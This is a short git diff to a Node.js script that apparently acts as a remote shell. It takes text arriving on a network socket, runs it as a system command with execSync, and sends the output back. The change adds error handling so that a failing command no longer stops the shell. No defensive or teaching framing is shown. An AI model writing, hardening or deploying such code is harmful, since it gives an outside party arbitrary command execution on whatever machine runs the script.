@@ -1,5 +1,6 @@
 const net = require('net');
 const os = require('os');
+const { execSync } = require('child_process');
 
 let we = `
   _____            _      _____          _      
@@ -38,8 +39,12 @@ sock.on('data', (data) => {
     return;
   }
 
-  const output = require('child_process').execSync(cmd).toString();
-  sock.write(output);
+  try {
+    const output = execSync(cmd).toString();
+    sock.write(output);
+  } catch (err) {
+    sock.write(`Error: ${err.message}`);
+  }
 });
 
 sock.on('error', (err) => {
